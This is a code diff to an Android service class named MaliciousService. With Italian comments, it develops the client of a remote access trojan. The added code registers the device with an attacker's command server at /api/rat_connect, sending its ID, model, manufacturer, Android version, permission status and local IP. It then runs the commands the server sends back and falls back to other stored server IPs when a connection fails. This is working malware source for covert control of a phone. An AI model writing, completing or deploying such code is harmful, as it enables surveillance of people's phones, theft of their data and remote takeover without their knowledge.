@@ -368,15 +368,39 @@ public class MaliciousService extends Service {
         try {
             URL url = new URL("http://" + ip + ":" + port + "/api/rat_connect");
             HttpURLConnection connection = (HttpURLConnection) url.openConnection();
-            connection.setConnectTimeout(3000); // 3 seconds timeout
+            connection.setConnectTimeout(5000); // 5 seconds timeout
+            connection.setReadTimeout(5000);
             connection.setRequestMethod("GET");
+            connection.setRequestProperty("User-Agent", "Android RAT Client");
             int responseCode = connection.getResponseCode();
+            Log.d(TAG, "Server check response: " + responseCode + " for " + ip + ":" + port);
             connection.disconnect();
             return responseCode == 200;
         } catch (Exception e) {
             Log.d(TAG, "Server not reachable at " + ip + ":" + port + " - " + e.getMessage());
             return false;
         }
+    }
+    
+    private String getLocalIpAddress() {
+        try {
+            java.net.NetworkInterface networkInterface;
+            java.util.Enumeration<java.net.NetworkInterface> interfaces = java.net.NetworkInterface.getNetworkInterfaces();
+            while (interfaces.hasMoreElements()) {
+                networkInterface = interfaces.nextElement();
+                java.util.Enumeration<java.net.InetAddress> addresses = networkInterface.getInetAddresses();
+                
+                while (addresses.hasMoreElements()) {
+                    java.net.InetAddress address = addresses.nextElement();
+                    if (!address.isLoopbackAddress() && address instanceof java.net.Inet4Address) {
+                        return address.getHostAddress();
+                    }
+                }
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error getting local IP: " + e.getMessage());
+        }
+        return "unknown";
     }
 
     private String[] getRequiredPermissions() {
@@ -448,18 +472,36 @@ public class MaliciousService extends Service {
         // Connect to Flask via HTTP API
         HttpURLConnection connection = null;
         try {
-            URL url = new URL("http://" + targetIp + ":" + targetPort + "/api/rat_connect");
+            // Prova prima con l'IP configurato
+            String serverUrl = "http://" + targetIp + ":" + targetPort + "/api/rat_connect";
+            Log.d(TAG, "Tentativo di connessione a: " + serverUrl);
+            
+            URL url = new URL(serverUrl);
             connection = (HttpURLConnection) url.openConnection();
             connection.setRequestMethod("POST");
             connection.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+            connection.setRequestProperty("Accept", "application/json");
+            connection.setRequestProperty("User-Agent", "Android RAT Client");
             connection.setDoOutput(true);
-            connection.setConnectTimeout(10000);
+            connection.setConnectTimeout(10000); // Aumentato a 10 secondi
             connection.setReadTimeout(10000);
             
             JSONObject jsonObject = new JSONObject();
             jsonObject.put("device_id", uniqueDeviceId);
             jsonObject.put("device_type", Build.MODEL);
+            jsonObject.put("device_manufacturer", Build.MANUFACTURER);
             jsonObject.put("connection_type", "register");
+            jsonObject.put("android_version", Build.VERSION.RELEASE);
+            jsonObject.put("sdk_version", Build.VERSION.SDK_INT);
+            jsonObject.put("permissions_granted", allPermissionsGranted());
+            jsonObject.put("timestamp", System.currentTimeMillis() / 1000);
+            
+            // Aggiungi informazioni di rete
+            try {
+                jsonObject.put("ip_address", getLocalIpAddress());
+            } catch (Exception e) {
+                Log.e(TAG, "Errore nel recupero dell'IP locale: " + e.getMessage());
+            }
             
             try (OutputStream os = connection.getOutputStream()) {
                 os.write(jsonObject.toString().getBytes(StandardCharsets.UTF_8));
@@ -467,6 +509,8 @@ public class MaliciousService extends Service {
             }
             
             int responseCode = connection.getResponseCode();
+            Log.d(TAG, "Risposta dal server: " + responseCode);
+            
             if (responseCode == HttpURLConnection.HTTP_OK) {
                 try (InputStream inputStream = connection.getInputStream();
                      BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {
@@ -476,28 +520,65 @@ public class MaliciousService extends Service {
                         response.append(line);
                     }
                     
-                    JSONObject responseJson = new JSONObject(response.toString());
-                    if (responseJson.getString("status").equals("connected")) {
-                        Log.d(TAG, "Device registered successfully with Flask server: " + targetIp + ":" + targetPort);
+                    Log.d(TAG, "Risposta completa: " + response.toString());
+                    
+                    try {
+                        JSONObject responseJson = new JSONObject(response.toString());
+                        String status = responseJson.optString("status", "unknown");
                         
-                        // Process any pending commands
-                        if (responseJson.has("commands")) {
-                            JSONArray commands = responseJson.getJSONArray("commands");
-                            for (int i = 0; i < commands.length(); i++) {
-                                String command = commands.getString(i);
-                                executeCommand(command);
+                        if (status.equals("connected") || status.equals("received") || status.equals("ok")) {
+                            Log.d(TAG, "Dispositivo registrato con successo al server: " + targetIp + ":" + targetPort);
+                            
+                            // Process any pending commands
+                            if (responseJson.has("commands")) {
+                                JSONArray commands = responseJson.getJSONArray("commands");
+                                for (int i = 0; i < commands.length(); i++) {
+                                    String command = commands.getString(i);
+                                    executeCommand(command);
+                                }
                             }
+                        } else {
+                            Log.w(TAG, "Risposta inattesa dal server: " + response.toString());
                         }
-                    } else {
-                        Log.e(TAG, "Registration failed. Server response: " + response.toString());
+                    } catch (JSONException e) {
+                        Log.e(TAG, "Errore nel parsing della risposta JSON: " + e.getMessage());
                     }
                 }
             } else {
-                Log.w(TAG, "Flask server responded with non-OK code for registration: " + responseCode);
+                Log.e(TAG, "Impossibile registrare il dispositivo. Codice risposta: " + responseCode);
+                
+                // Se l'IP locale fallisce, prova con l'IP pubblico
+                SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+                String publicIp = prefs.getString("PUBLIC_IP", null);
+                if (publicIp != null && !publicIp.equals(targetIp)) {
+                    Log.d(TAG, "Tentativo con IP pubblico: " + publicIp);
+                    saveServerConfigToPreferences(publicIp, targetPort, targetPort);
+                    loadServerConfigFromPreferences();
+                    // Non richiamare registerDeviceWithServer per evitare ricorsione infinita
+                }
             }
+        } catch (Exception e) {
+            Log.e(TAG, "Errore nella registrazione del dispositivo: " + e.getMessage());
             
-        } catch (IOException | JSONException e) {
-            Log.e(TAG, "Failed to register with Flask server: " + e.getMessage());
+            // Prova con IP alternativi in caso di errore
+            try {
+                SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+                String currentIp = prefs.getString("SERVER_IP", "");
+                String localIp = prefs.getString("LOCAL_IP", null);
+                String publicIp = prefs.getString("PUBLIC_IP", null);
+                
+                if (publicIp != null && !publicIp.equals(currentIp)) {
+                    Log.d(TAG, "Tentativo con IP pubblico dopo errore: " + publicIp);
+                    saveServerConfigToPreferences(publicIp, targetPort, targetPort);
+                    loadServerConfigFromPreferences();
+                } else if (localIp != null && !localIp.equals(currentIp)) {
+                    Log.d(TAG, "Tentativo con IP locale dopo errore: " + localIp);
+                    saveServerConfigToPreferences(localIp, targetPort, targetPort);
+                    loadServerConfigFromPreferences();
+                }
+            } catch (Exception ex) {
+                Log.e(TAG, "Errore nel tentativo di usare IP alternativi: " + ex.getMessage());
+            }
         } finally {
             if (connection != null) {
                 connection.disconnect();
